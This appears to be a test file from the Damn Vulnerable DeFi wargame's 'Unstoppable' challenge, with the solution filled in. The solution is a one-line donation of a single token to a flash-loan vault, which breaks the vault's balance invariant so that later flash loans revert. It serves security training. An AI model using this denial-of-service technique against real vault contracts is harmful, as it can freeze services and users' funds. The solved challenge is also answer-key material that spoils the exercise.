import { expect } from 'chai';
import { ethers } from 'hardhat';

describe('[Challenge] Unstoppable', function () {
  it('should make the vault stop offering flash loans', async function () {
    const TOKENS_IN_VAULT = 1000000n * 10n ** 18n;
    const INITIAL_PLAYER_TOKEN_BALANCE = 10n * 10n ** 18n;

    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    const [deployer, player, someUser] = await ethers.getSigners();

    const token = await ethers.deployContract('DamnValuableToken', deployer);
    const vault = await ethers.deployContract('UnstoppableVault', [token, deployer, deployer], deployer);

    expect(await vault.asset()).to.eq(token);

    await token.approve(vault, TOKENS_IN_VAULT);
    await vault.deposit(TOKENS_IN_VAULT, deployer);

    expect(await token.balanceOf(vault)).to.eq(TOKENS_IN_VAULT);
    expect(await vault.totalAssets()).to.eq(TOKENS_IN_VAULT);
    expect(await vault.totalSupply()).to.eq(TOKENS_IN_VAULT);
    expect(await vault.maxFlashLoan(token)).to.eq(TOKENS_IN_VAULT);
    expect(await vault.flashFee(token, TOKENS_IN_VAULT - 1n)).to.eq(0);
    expect(await vault.flashFee(token, TOKENS_IN_VAULT)).to.eq(50000n * 10n ** 18n);

    await token.transfer(player.address, INITIAL_PLAYER_TOKEN_BALANCE);
    expect(await token.balanceOf(player.address)).to.eq(INITIAL_PLAYER_TOKEN_BALANCE);

    // Show it's possible for someUser to take out a flash loan
    const receiverContract = await ethers.deployContract('ReceiverUnstoppable', [vault], someUser);
    await receiverContract.executeFlashLoan(100n * 10n ** 18n);

    /** CODE YOUR SOLUTION HERE */
    await token.transfer(vault, 1);

    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // It is no longer possible to execute flash loans
    await expect(receiverContract.executeFlashLoan(100n * 10n ** 18n)).to.be.reverted;
  });
});
